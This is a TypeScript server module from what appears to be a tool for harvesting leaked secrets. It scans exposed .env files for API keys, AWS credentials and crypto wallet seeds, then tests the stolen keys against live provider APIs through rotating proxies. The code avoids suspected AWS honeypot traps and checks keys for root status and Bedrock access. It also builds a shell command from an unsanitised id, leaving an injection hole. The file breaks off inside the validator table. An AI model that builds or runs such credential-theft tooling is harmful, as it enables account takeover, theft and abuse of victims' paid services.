import { Router } from "express";
import { spawn, ChildProcess, execSync } from "child_process";
import fs from "fs";
import os from "os";
import readline from "readline";
import path from "path";
import https from "node:https";
import { fileURLToPath } from "url";
import { createHmac, createHash } from "crypto";
import { HttpsProxyAgent } from "https-proxy-agent";
import { detectHoneypotHosts } from "./env-scan.js";
import { getAutoChainStatus, triggerAutoChain, setManualMode, getManualMode } from "./auto-chain.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const MONITOR_DIR = path.resolve(__dirname, "../../../monitor");
const DATA_DIR = path.join(MONITOR_DIR, "data");
const CONFIG_DIR = path.join(MONITOR_DIR, "config");
const STATUS_FILE = path.join(DATA_DIR, "status.json");
const RESULTS_FILE = path.join(DATA_DIR, "results.jsonl");
const KEYS_FILE = path.join(DATA_DIR, "found_keys.jsonl");
const NEW_RESULTS_FILE = path.join(DATA_DIR, "new_results.jsonl");
const SETTINGS_FILE = path.join(CONFIG_DIR, "settings.json");
const SOURCES_FILE = path.join(CONFIG_DIR, "sources.json");
const TRIGGER_FILE = path.join(DATA_DIR, "trigger_cycle");
const PROXY_CONFIG_FILE = path.join(DATA_DIR, "proxy_config.json");
const USER_PROXIES_FILE = path.join(DATA_DIR, "user_proxies.txt");
const USER_PROXIES_CONFIG_FILE = path.join(DATA_DIR, "user_proxies_config.json");

// â”€â”€ Stats cache (avoid reading 200MB found_keys.jsonl on every request) â”€â”€
let _statsCache: { data: Record<string, unknown>; ts: number } | null = null;
const STATS_CACHE_TTL_MS = 30_000; // 30 s
function invalidateStatsCache() { _statsCache = null; }
// -- Keys base-record in-memory cache -----------------------------------------
// appendKeyValidation() previously read the entire 75MB found_keys.jsonl
// synchronously for every call, blocking the event loop for 0.5-2s each time.
// 20 validations x 2s = 40s blocking per 45s cycle -> server frozen.
// Fix: in-memory Map populated by readKeysDedup(), updated on every write.
const _keysBaseCache = new Map<string, Record<string, unknown>>();

// â”€â”€ Amazon IP ranges (honeypot detection for AWS keys) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Official AWS IP ranges: https://ip-ranges.amazonaws.com/ip-ranges.json
// AWS keys found on Amazon-hosted IPs are usually planted honeypot traps.
const AMAZON_RANGES_FILE = path.join(DATA_DIR, "amazon_ip_ranges.json");
let _amazonV4Ranges: { start: number; end: number }[] | null = null;

function ipv4ToInt(ip: string): number | null {
  const parts = ip.split(".");
  if (parts.length !== 4) return null;
  let val = 0;
  for (const p of parts) {
    const n = parseInt(p, 10);
    if (isNaN(n) || n < 0 || n > 255) return null;
    val = (val << 8) | n;
  }
  return val >>> 0;
}

async function refreshAmazonRanges(): Promise<void> {
  // Use cached copy if fresh (< 24h)
  try {
    if (fs.existsSync(AMAZON_RANGES_FILE)) {
      const cached = JSON.parse(fs.readFileSync(AMAZON_RANGES_FILE, "utf-8")) as {
        v4?: { start: number; end: number }[]; fetchedAt?: number;
      };
      const age = Date.now() - (cached.fetchedAt ?? 0);
      if (age < 24 * 3600 * 1000 && Array.isArray(cached.v4) && cached.v4.length > 0) {
        _amazonV4Ranges = cached.v4;
        console.log(`[amazon-ranges] using cache: ${cached.v4.length} IPv4 prefixes`);
        return;
      }
    }
  } catch { /* stale/broken cache */ }

  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 25_000);
    const resp = await fetch("https://ip-ranges.amazonaws.com/ip-ranges.json", { signal: controller.signal });
    clearTimeout(timer);
    const data = await resp.json() as { prefixes?: { ip_prefix?: string }[] };
    const ranges: { start: number; end: number }[] = [];
    for (const p of data.prefixes ?? []) {
      if (!p.ip_prefix) continue;
      const [addr, bitsStr] = p.ip_prefix.split("/");
      const base = ipv4ToInt(addr);
      const bits = parseInt(bitsStr, 10);
      if (base === null || isNaN(bits) || bits < 0 || bits > 32) continue;
      const mask = bits === 0 ? 0 : ((~0) << (32 - bits)) >>> 0;
      ranges.push({ start: base & mask, end: (base | (mask ^ 0xffffffff)) >>> 0 });
    }
    ranges.sort((a, b) => a.start - b.start);
    fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(AMAZON_RANGES_FILE, JSON.stringify({ v4: ranges, fetchedAt: Date.now() }));
    _amazonV4Ranges = ranges;
    console.log(`[amazon-ranges] loaded ${ranges.length} IPv4 prefixes from official AWS list`);
  } catch (e) {
    console.log(`[amazon-ranges] fetch failed: ${String(e)} â€” amazon honeypot check disabled`);
  }
}

/** Check if an IP belongs to Amazon's published ranges */
function isAmazonIp(ip: string): boolean {
  if (!_amazonV4Ranges || _amazonV4Ranges.length === 0) return false;
  const val = ipv4ToInt(ip);
  if (val === null) return false;
  // Binary search on sorted ranges
  let lo = 0, hi = _amazonV4Ranges.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    const r = _amazonV4Ranges[mid];
    if (val < r.start) hi = mid - 1;
    else if (val > r.end) lo = mid + 1;
    else return true;
  }
  return false;
}

/** Extract host IP/hostname from a found_keys record.
 *  Handles:
 *  - Direct IP in query field (most common for env scanner)
 *  - Direct IP in URL hostname
 *  - EC2 hostname: ec2-13-49-244-20.eu-north-1.compute.amazonaws.com â†’ 13.49.244.20
 *  - Any *.amazonaws.com hostname â†’ returned as-is (caught by isAmazonHost)
 */
function extractHostIp(raw: Record<string, unknown>): string {
  const q = String(raw.query ?? "");
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(q)) return q;
  try {
    const u = new URL(String(raw.url ?? ""));
    const h = u.hostname;
    if (!h) return "";
    // Direct IP
    if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h)) return h;
    // EC2 hostname: ec2-13-49-244-20.region.compute.amazonaws.com
    const ec2m = /^ec2-(\d+)-(\d+)-(\d+)-(\d+)\./.exec(h);
    if (ec2m) return `${ec2m[1]}.${ec2m[2]}.${ec2m[3]}.${ec2m[4]}`;
    // Any amazonaws.com domain â†’ definitely Amazon-hosted
    if (h.endsWith(".amazonaws.com")) return h;
  } catch { /* ignore */ }
  return "";
}

/** Check if an IP or hostname is Amazon-hosted */
function isAmazonHost(ipOrHost: string): boolean {
  if (!ipOrHost) return false;
  // amazonaws.com hostname â†’ always Amazon
  if (ipOrHost.endsWith(".amazonaws.com")) return true;
  // Check IP against ranges
  return isAmazonIp(ipOrHost);
}


// â”€â”€ Python process management â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

let monitorProcess: ChildProcess | null = null;

function ensureDataDir() {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function startMonitor() {
  ensureDataDir();
  if (monitorProcess && !monitorProcess.killed) return;

  // Try workspace pythonlibs first (installed via uv), then venv, then system python3
  const pythonlibsBin = path.join(path.resolve(__dirname, "../../../"), ".pythonlibs", "bin", "python3");
  const venvPython = path.join(MONITOR_DIR, ".venv", "bin", "python");
  const systemPython = process.platform === "win32" ? "python" : "python3";
  const pythonBin = fs.existsSync(pythonlibsBin)
    ? pythonlibsBin
    : fs.existsSync(venvPython)
      ? venvPython
      : systemPython;

  monitorProcess = spawn(pythonBin, ["search_monitor.py"], {
    cwd: MONITOR_DIR,
    stdio: ["ignore", "pipe", "pipe"],
    env: { ...process.env, PYTHONUNBUFFERED: "1" },
  });

  monitorProcess.stdout?.on("data", (d: Buffer) => {
    process.stdout.write(`[monitor] ${d.toString()}`);
  });
  monitorProcess.stderr?.on("data", (d: Buffer) => {
    process.stderr.write(`[monitor] ${d.toString()}`);
  });
  monitorProcess.on("exit", (code) => {
    console.log(`[monitor] process exited with code ${code}, restarting in 5sâ€¦`);
    monitorProcess = null;
    setTimeout(startMonitor, 5000);
  });
}

// â”€â”€ File helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function readJson(filePath: string, fallback: unknown): unknown {
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch {
    return fallback;
  }
}

function updateJsonlRecord(filePath: string, id: string, updates: Record<string, unknown>): boolean {
  // For the keys file: append-only to avoid racing with the Go scanner.
  // The scanner uses O_APPEND (atomic on Linux). A full-file rewrite would
  // permanently lose any entries it appended between our read and writeFileSync.
  if (filePath === KEYS_FILE) {
    return appendKeyValidation(id, updates);
  }
  // For all other files: atomic rename (write .tmp â†’ rename) so readers
  // always see a complete file.
  try {
    const records = readJsonl(filePath);
    let found = false;
    const updated = records.map((r) => {
      const rid = String(r.fingerprint ?? r.id ?? "");
      if (rid === id) { found = true; return { ...r, ...updates }; }
      return r;
    });
    if (!found) return false;
    const tmpPath = filePath + ".tmp." + process.pid;
    fs.writeFileSync(tmpPath, updated.map((r) => JSON.stringify(r)).join("\n") + "\n");
    fs.renameSync(tmpPath, filePath);
    return true;
  } catch { return false; }
}

// Appends a validation-updated copy of a key record to KEYS_FILE.
// Never rewrites the file — safe to call while the Go scanner appends concurrently.
// Uses tac|grep to find the latest record for this fingerprint WITHOUT reading the
// entire file into memory (critical for large files — avoids blocking the event loop).
function appendKeyValidation(id: string, updates: Record<string, unknown>): boolean {
  try {
    // O(1) lookup from in-memory cache (populated by readKeysDedup)
    let base = _keysBaseCache.get(id);

    // Cache miss (new key added by scanner after last readKeysDedup) — fast grep fallback
    if (!base) {
      try {
        const grepOut = execSync(
          `tac "${KEYS_FILE}" | grep -m1 '"fingerprint":"${id}"'`,
          { encoding: "utf-8", maxBuffer: 2 * 1024 * 1024, timeout: 3000 }
        ).trim();
        if (grepOut) base = JSON.parse(grepOut) as Record<string, unknown>;
      } catch { /* not found */ }
    }

    if (!base) return false;
    const updated = { ...base, ...updates };
    _keysBaseCache.set(id, updated); // keep cache current
    fs.appendFileSync(KEYS_FILE, JSON.stringify(updated) + "\n");
    return true;
  } catch { return false; }
}

// Deduplicate KEYS_FILE by fingerprint.  Entries that have already been
// validated (validated_at != null) are preserved even if the scanner later
// re-appends the same fingerprint as "unchecked".
function readKeysDedup(): Record<string, unknown>[] {
  const all = readJsonl(KEYS_FILE);
  const map = new Map<string, Record<string, unknown>>();
  for (const r of all) {
    const id = String(r.fingerprint ?? r.id ?? "");
    if (!id) continue;
    const existing = map.get(id);
    if (!existing) { map.set(id, r); continue; }
    if (existing.validated_at != null && r.validated_at == null) continue;
    map.set(id, r);
  }
  // Populate the in-memory base cache so appendKeyValidation() is O(1)
  for (const [id, r] of map) _keysBaseCache.set(id, r);
  return [...map.values()];
}

// Returns current deduped keys from in-memory cache (O(1), non-blocking).
// Faster than readKeysDedup() which reads the entire file synchronously.
// The cache is refreshed every 5 minutes by refreshKeysCache().
function keysFromCache(): Record<string, unknown>[] {
  return [..._keysBaseCache.values()];
}

// Periodic full cache refresh (reads file, rebuilds dedup map).
// Called every 5 minutes rather than on every auto-validate cycle.
function refreshKeysCache(): void {
  try {
    readKeysDedup(); // populates _keysBaseCache
  } catch { /* ignore */ }
}

// Compact KEYS_FILE: rewrite with one entry per fingerprint using atomic
// rename. Called hourly to prevent unbounded file growth from append-only
// validation updates.
function compactKeysFile(): void {
  try {
    const deduped = readKeysDedup();
    const tmpPath = KEYS_FILE + ".compact." + process.pid;
    fs.writeFileSync(tmpPath, deduped.map((r) => JSON.stringify(r)).join("\n") + "\n");
    fs.renameSync(tmpPath, KEYS_FILE);
    console.log(`[monitor] compacted found_keys.jsonl â†’ ${deduped.length} unique entries`);
  } catch (e) {
    console.error("[monitor] compactKeysFile failed:", e);
  }
}

function readJsonl(filePath: string): Record<string, unknown>[] {
  try {
    const content = fs.readFileSync(filePath, "utf-8");
    return content
      .trim()
      .split("\n")
      .filter(Boolean)
      .map((line) => {
        try {
          return JSON.parse(line) as Record<string, unknown>;
        } catch {
          return null;
        }
      })
      .filter(Boolean) as Record<string, unknown>[];
  } catch {
    return [];
  }
}

const SERVICE_CATEGORY: Record<string, string> = {
  openai: "ai", anthropic: "ai", openrouter: "ai", "google-gemini": "ai", google: "ai",
  huggingface: "ai", replicate: "ai", groq: "ai", perplexity: "ai", deepseek: "ai",
  cohere: "ai", mistral: "ai", xai: "ai",
  moonshot: "ai", dashscope: "ai", minimax: "ai", zhipuai: "ai",
  stripe: "payments", "stripe-publishable": "payments",
  paypal: "payments", braintree: "payments", square: "payments",
  shopify: "payments", paddle: "payments",
  sendgrid: "email", mailgun: "email", resend: "email", postmark: "email",
  aws: "cloud", digitalocean: "cloud", cloudflare: "cloud",
  github: "auth", gitlab: "auth", jwt: "auth",
  telegram: "messaging", slack: "messaging", "slack-webhook": "messaging",
  discord: "messaging", "discord-webhook": "messaging", twilio: "messaging",
  postgresql: "database", mysql: "database", mongodb: "database", redis: "database",
  ethereum: "crypto", bitcoin: "crypto", solana: "crypto", bip39_seed: "crypto",
  binance: "crypto", coinbase: "crypto", kraken: "crypto", metamask_vault: "crypto",
};

function inferCategory(service: string): string | null {
  return SERVICE_CATEGORY[service] ?? null;
}

// â”€â”€ User proxy helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function getUserProxies(): string[] {
  try {
    if (!fs.existsSync(USER_PROXIES_FILE)) return [];
    return fs.readFileSync(USER_PROXIES_FILE, "utf-8")
      .split("\n")
      .map(l => l.trim())
      .filter(l => l && l.includes("@") && l.includes(":"));
  } catch { return []; }
}

function isUserProxyEnabled(): boolean {
  try {
    if (!fs.existsSync(USER_PROXIES_CONFIG_FILE)) return false;
    const j = JSON.parse(fs.readFileSync(USER_PROXIES_CONFIG_FILE, "utf-8")) as { enabled?: unknown };
    return j.enabled === true;
  } catch { return false; }
}

function getRandomUserProxy(): string | null {
  if (!isUserProxyEnabled()) return null;
  const proxies = getUserProxies();
  if (!proxies.length) return null;
  const raw = proxies[Math.floor(Math.random() * proxies.length)];
  // Normalise: user:pass@host:port â†’ http://user:pass@host:port
  return raw.startsWith("http") ? raw : `http://${raw}`;
}

// Low-level HTTPS fetch that goes through an HTTP CONNECT proxy.
// Returns a minimal Response-like object compatible with httpToStatus().
function fetchViaProxy(
  urlStr: string,
  options: { method?: string; headers?: Record<string, string>; body?: string; timeoutMs?: number },
  proxyUrl: string,
): Promise<{ status: number }> {
  return new Promise((resolve, reject) => {
    const agent = new HttpsProxyAgent(proxyUrl);
    const parsed = new URL(urlStr);
    const method = options.method ?? "GET";
    const bodyBuf = options.body ? Buffer.from(options.body, "utf-8") : null;
    const reqOpts: https.RequestOptions = {
      hostname: parsed.hostname,
      port: parseInt(parsed.port || (parsed.protocol === "https:" ? "443" : "80")),
      path: parsed.pathname + parsed.search,
      method,
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; kmon/1.0)",
        ...(bodyBuf ? { "Content-Type": "application/json", "Content-Length": String(bodyBuf.length) } : {}),
        ...(options.headers ?? {}),
      },
      agent,
      timeout: options.timeoutMs ?? 15000,
    };
    const req = https.request(reqOpts, (res) => {
      res.resume(); // drain body so socket is released
      resolve({ status: res.statusCode ?? 0 });
    });
    req.on("timeout", () => { req.destroy(); reject(new Error("proxy timeout")); });
    req.on("error", (err) => reject(new Error(`proxy error: ${err.message}`)));
    if (bodyBuf) req.write(bodyBuf);
    req.end();
  });
}

function normalizeResult(r: Record<string, unknown>): Record<string, unknown> {
  return {
    id: r.fingerprint || r.id || String(Math.random()),
    type: r.type || (r.key ? "key" : "url"),
    key: r.key ?? null,
    keyMasked: r.key_masked ?? r.keyMasked ?? null,
    service: r.service ?? null,
    category: r.category ?? inferCategory(String(r.service ?? "")),
    source: r.source || "",
    query: r.query || "",
    url: r.url || "",
    title: r.title || "",
    snippet: r.snippet || "",
    status: r.status || "unchecked",
    validatedAt: r.validated_at ?? r.validatedAt ?? null,
    publishedAt: r.published_at ?? r.publishedAt ?? null,
    firstSeenAt: r.first_seen_at ?? r.firstSeenAt ?? "",
    // AWS-specific fields
    awsAccountId: r.aws_account_id ?? null,
    awsArn: r.aws_arn ?? null,
    awsKeyType: r.aws_key_type ?? null,
    awsBedrockToken: r.aws_bedrock_token ?? null,
    // Bedrock access = IAM permission (bedrock:ListFoundationModels = 200)
    //                  OR ABSK token present in env (separate Bedrock API key auth)
    // ABSK tokens are pre-generated Bedrock API keys — they work independently
    // from IAM policies and allow direct model invocation via Bearer auth.
    awsBedrockAccess: (r.aws_bedrock_access === true) || (!!r.aws_bedrock_token),
    amazonHosted: r.amazon_hosted ?? false,
  };
}

// â”€â”€ AWS SigV4 signing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function sha256Hex(data: string | Buffer): string {
  return createHash("sha256").update(data).digest("hex");
}

function hmacSha256(key: string | Buffer, data: string): Buffer {
  return createHmac("sha256", key).update(data, "utf8").digest();
}

/** Build SigV4 Authorization headers for an AWS API call */
function buildSigV4Headers(
  accessKeyId: string,
  secretKey: string,
  service: string,
  region: string,
  method: string,
  host: string,
  pathStr: string,
  queryStr: string,
  body: string,
): Record<string, string> {
  const now = new Date();
  const amzDate = now.toISOString().replace(/[-:]/g, "").replace(/\.\d{3}Z$/, "Z");
  const dateStamp = amzDate.slice(0, 8);
  const payloadHash = sha256Hex(body);
  const contentType = body ? "application/x-www-form-urlencoded" : "";

  const rawHeaders: Record<string, string> = {
    host,
    "x-amz-date": amzDate,
  };
  if (contentType) rawHeaders["content-type"] = contentType;

  const signedHeaderNames = Object.keys(rawHeaders).sort();
  const signedHeaders = signedHeaderNames.join(";");
  const canonicalHeaders = signedHeaderNames
    .map((k) => `${k}:${rawHeaders[k].trim()}\n`)
    .join("");

  const canonicalRequest = [
    method,
    pathStr,
    queryStr,
    canonicalHeaders,
    signedHeaders,
    payloadHash,
  ].join("\n");

  const credentialScope = `${dateStamp}/${region}/${service}/aws4_request`;
  const stringToSign = [
    "AWS4-HMAC-SHA256",
    amzDate,
    credentialScope,
    sha256Hex(canonicalRequest),
  ].join("\n");

  const signingKey = hmacSha256(
    hmacSha256(
      hmacSha256(
        hmacSha256(`AWS4${secretKey}`, dateStamp),
        region,
      ),
      service,
    ),
    "aws4_request",
  );
  const signature = createHmac("sha256", signingKey).update(stringToSign).digest("hex");

  return {
    ...rawHeaders,
    Authorization:
      `AWS4-HMAC-SHA256 Credential=${accessKeyId}/${credentialScope}, ` +
      `SignedHeaders=${signedHeaders}, Signature=${signature}`,
  };
}

/** Make a SigV4-signed HTTPS request via proxy */
function fetchAwsViaProxy(
  urlStr: string,
  method: string,
  headers: Record<string, string>,
  body: string,
  proxyUrl: string,
  timeoutMs = 15000,
): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const agent = new HttpsProxyAgent(proxyUrl);
    const parsed = new URL(urlStr);
    const bodyBuf = body ? Buffer.from(body, "utf-8") : null;
    const reqOpts: https.RequestOptions = {
      hostname: parsed.hostname,
      port: parseInt(parsed.port || "443"),
      path: parsed.pathname + parsed.search,
      method,
      headers: {
        "User-Agent": "aws-sdk-nodejs/3.0 (Node.js)",
        ...(bodyBuf ? { "Content-Length": String(bodyBuf.length) } : {}),
        ...headers,
      },
      agent,
      timeout: timeoutMs,
    };
    const req = https.request(reqOpts, (res) => {
      const chunks: Buffer[] = [];
      res.on("data", (c: Buffer) => chunks.push(c));
      res.on("end", () =>
        resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf-8") }),
      );
    });
    req.on("timeout", () => { req.destroy(); reject(new Error("AWS request timeout")); });
    req.on("error", (e) => reject(new Error(`AWS request error: ${e.message}`)));
    if (bodyBuf) req.write(bodyBuf);
    req.end();
  });
}

/** Extract AWS secret key from .env snippet/content.
 *  Handles:
 *  1. ENV format:    AWS_SECRET_ACCESS_KEY=<40chars>
 *  2. JSON format:   "secretAccessKey": "<40chars>"
 *  3. Old style:     aws_secret_key = "<40chars>"
 *  4. Alt names:     BUCKET_SECRET_KEY, S3_SECRET_KEY, MINIO_SECRET_KEY, etc.
 *  5. Truncated:     snippet starts mid-line e.g. "EY=<40chars>"
 */
function extractAwsSecret(text: string): string {
  // Case 1: standard env var names (longest prefix match wins)
  const envMatch = /(?:AWS_SECRET_ACCESS_KEY|S3_SECRET(?:_ACCESS)?_KEY|BUCKET_SECRET(?:_ACCESS)?_KEY|MINIO_SECRET(?:_ACCESS)?_KEY|SPACES_SECRET(?:_KEY)?|DO_SPACES_SECRET|R2_SECRET_ACCESS_KEY|CF_R2_SECRET|STORJ_SECRET_KEY|WASABI_SECRET(?:_ACCESS)?_KEY|B2_APPLICATION_KEY)[^\n=]{0,10}\s*[=:]\s*["']?([A-Za-z0-9/+=]{38,44})["']?/i.exec(text);
  if (envMatch) return envMatch[1].slice(0, 40);

  // Case 2: JSON format (AWS SDK config, credentials.json, etc.)
  //   "secretAccessKey": "VALUE"  |  "aws_secret_access_key": "VALUE"
  const jsonMatch = /["'](?:secretAccessKey|secret_access_key|aws_secret_access_key)["']\s*:\s*["']([A-Za-z0-9/+=]{38,44})["']/i.exec(text);
  if (jsonMatch) return jsonMatch[1].slice(0, 40);

  // Case 3: old-style loose names
  //   aws_secret_key = "VALUE"  |  secret_key = "VALUE"
  const oldMatch = /(?:aws_secret_key|secret_key|secret|aws_secret)\s*[=:]\s*["']([A-Za-z0-9/+=]{38,44})["']/i.exec(text);
  if (oldMatch) return oldMatch[1].slice(0, 40);

  // Case 4: truncated snippet â€” first line is tail of secret assignment
  //   e.g. snippet starts: "EY=<40chars>\nAWS_ACCESS_KEY=AKIA..."
  for (const line of text.split("\n").slice(0, 5)) {
    const pm = /^[A-Z0-9_\-]{0,30}[=:]\s*["']?([A-Za-z0-9/+=]{38,44})["']?\s*$/i.exec(line.trim());
    if (pm && pm[1].length >= 38) return pm[1].slice(0, 40);
  }

  return "";
}

/** Extract a Bedrock API key (ABSK...) from .env content.
 *  AWS_BEARER_TOKEN_BEDROCK / AWS_BEDROCK_API_KEY / BEDROCK_BEARER_TOKEN etc.
 */
function extractAwsBedrockToken(text: string): string {
  const m = /(?:AWS_BEARER_TOKEN_BEDROCK|AWS_BEDROCK_API_KEY|BEDROCK_BEARER_TOKEN|BEDROCK_API_KEY|AWS_BEDROCK_TOKEN)[^\n=]{0,12}\s*[=:]\s*["']?((?:ABSK|ask-|bt-[A-Za-z0-9])[A-Za-z0-9+/=.:_-]{30,})["']?/i.exec(text);
  return m ? m[1] : "";
}

/** Get full .env content from env_found.jsonl by URL match.
 *  Uses -F (fixed string, no regex) to avoid dot/special-char issues in URLs.
 */
function getEnvFoundContent(itemUrl: string): string {
  if (!itemUrl) return "";
  const ENV_FOUND_FILE = path.join(DATA_DIR, "env_found.jsonl");
  try {
    if (!fs.existsSync(ENV_FOUND_FILE)) return "";
    // -F = fixed string (no regex metachar expansion), -m1 = stop at first match
    const grepOut = execSync(
      `grep -F -m1 ${JSON.stringify(itemUrl)} "${ENV_FOUND_FILE}"`,
      { encoding: "utf-8", maxBuffer: 4 * 1024 * 1024, timeout: 5000 },
    ).trim();
    if (!grepOut) return "";
    const e = JSON.parse(grepOut) as Record<string, unknown>;
    return String(e.content_preview ?? "");
  } catch {
    return "";
  }
}

/** Validate AWS key pair via STS GetCallerIdentity with SigV4 */
async function performAwsValidation(
  accessKeyId: string,
  secretKey: string,
  proxyUrl: string,
): Promise<{ status: number; accountId: string; arn: string; keyType: string }> {
  const host = "sts.amazonaws.com";
  const region = "us-east-1";
  const body = "Action=GetCallerIdentity&Version=2011-06-15";
  // buildSigV4Headers already includes content-type (lowercase) as a signed header.
  // Do NOT add a second Content-Type here â€” duplicate header breaks the signature.
  const headers = buildSigV4Headers(accessKeyId, secretKey, "sts", region, "POST", host, "/", "", body);
  const resp = await fetchAwsViaProxy(
    `https://${host}/`,
    "POST",
    headers,
    body,
    proxyUrl,
  );

  let accountId = "";
  let arn = "";
  let keyType = "";
  if (resp.status === 200) {
    const m1 = /<Account>([^<]+)<\/Account>/.exec(resp.body);
    const m2 = /<Arn>([^<]+)<\/Arn>/.exec(resp.body);
    accountId = m1 ? m1[1] : "";
    arn = m2 ? m2[1] : "";
    // Detect key type: root vs IAM user vs assumed role vs federated
    if (arn.includes(":root")) keyType = "root";
    else if (arn.includes(":assumed-role/")) keyType = "assumed-role";
    else if (arn.includes(":user/")) keyType = "iam-user";
    else keyType = "other";
  }
  return { status: resp.status, accountId, arn, keyType };
}

/** Check if AWS credentials have Amazon Bedrock access */
async function checkBedrockAccess(
  accessKeyId: string,
  secretKey: string,
  proxyUrl: string,
): Promise<boolean> {
  // Bedrock foundation-models list â€” returns 200 if account has Bedrock access
  const host = "bedrock.us-east-1.amazonaws.com";
  const region = "us-east-1";
  const pathStr = "/foundation-models";
  const headers = buildSigV4Headers(accessKeyId, secretKey, "bedrock", region, "GET", host, pathStr, "", "");
  try {
    const resp = await fetchAwsViaProxy(
      `https://${host}${pathStr}`,
      "GET",
      headers,
      "",
      proxyUrl,
      10000,
    );
    return resp.status === 200;
  } catch {
    return false;
  }
}

// â”€â”€ Key validator table â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

type ValidatorEntry = {
  url: string;
  method?: "GET" | "POST";
  headerFn: (k: string) => Record<string, string>;
  urlFn?: (k: string) => string;
  body?: unknown;
  category?: string;
  // Special validators that bypass HTTP entirely
  special?: "jwt" | "connection_string" | "webhook_url";
  // If true: skip validation when no user proxy is available (e.g. AWS STS
  // calls should never go out on the bare VPS IP to avoid IP-level bans)
  requireProxy?: boolean;
};

const PROVIDER_VALIDATORS: Record<string, ValidatorEntry> = {
  // â”€â”€ AI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  moonshot:     { category: "ai",       url: "https://api.moonshot.cn/v1/models",            headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  dashscope:    { category: "ai",       url: "https://dashscope.aliyuncs.com/compatible-mode/v1/models", headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  minimax:      { category: "ai",       url: "https://api.minimax.chat/v1/me",               headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  zhipuai:      { category: "ai",       url: "https://open.bigmodel.cn/api/paas/v4/models",  headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  openai:       { category: "ai",       url: "https://api.openai.com/v1/models",            headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  anthropic:    { category: "ai",       url: "https://api.anthropic.com/v1/models",         headerFn: (k) => ({ "x-api-key": k, "anthropic-version": "2023-06-01" }) },
  openrouter:   { category: "ai",       url: "https://openrouter.ai/api/v1/auth/key",       headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  huggingface:  { category: "ai",       url: "https://huggingface.co/api/whoami",           headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  groq:         { category: "ai",       url: "https://api.groq.com/openai/v1/models",       headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  perplexity:   { category: "ai",       url: "https://api.perplexity.ai/chat/completions",  method: "POST",
    headerFn: (k) => ({ Authorization: `Bearer ${k}` }),
    body: { model: "llama-3.1-sonar-small-128k-online", messages: [{ role: "user", content: "hi" }], max_tokens: 1 },
  },
  replicate:    { category: "ai",       url: "https://api.replicate.com/v1/account",        headerFn: (k) => ({ Authorization: `Token ${k}` }) },
  cohere:       { category: "ai",       url: "https://api.cohere.com/v2/models",            headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  google:           { category: "ai", url: "", headerFn: () => ({}), urlFn: (k) => `https://generativelanguage.googleapis.com/v1beta/models?key=${k}` },
  "google-gemini":  { category: "ai", url: "", headerFn: () => ({}), urlFn: (k) => `https://generativelanguage.googleapis.com/v1beta/models?key=${k}` },
  deepseek:     { category: "ai",       url: "https://api.deepseek.com/models",             headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  mistral:      { category: "ai",       url: "https://api.mistral.ai/v1/models",            headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  xai:          { category: "ai",       url: "https://api.x.ai/v1/models",                 headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  // â”€â”€ Payments â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
